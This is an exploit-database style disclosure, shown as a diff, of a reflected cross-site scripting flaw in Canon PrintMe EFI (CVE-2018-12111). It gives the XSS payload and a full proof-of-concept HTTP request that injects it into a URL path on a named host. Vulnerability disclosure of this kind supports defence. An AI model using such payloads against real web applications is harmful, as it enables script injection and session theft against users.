@@ -1,0 +1,20 @@
+# Title: Canon PrintMe EFI - Cross-Site Scripting	 
+# Date: 9.6.2018-06-09	 
+# Exploit Author: Huy Kha	
+# Vendor Homepage: [https://www.efi.com/]  
+# Version: Canon PrintMe EFI	
+# Tested on: Mozilla FireFox 
+# CVE: CVE-2018-12111
+# XSS Payload used: '"--!><img src=x onerror=alert("XSS")>
+	
+# PoC
+	
+GET /wt3/mydocs.php/'%22--!%3E%3Cimg%20src=x%20onerror=alert(%22XSS%22)%3E HTTP/1.1
+Host: 129.25.8.177
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=a11b2588fe327f6bd1acf79f286c2dcd
+Connection: close
+Upgrade-Insecure-Requests: 1
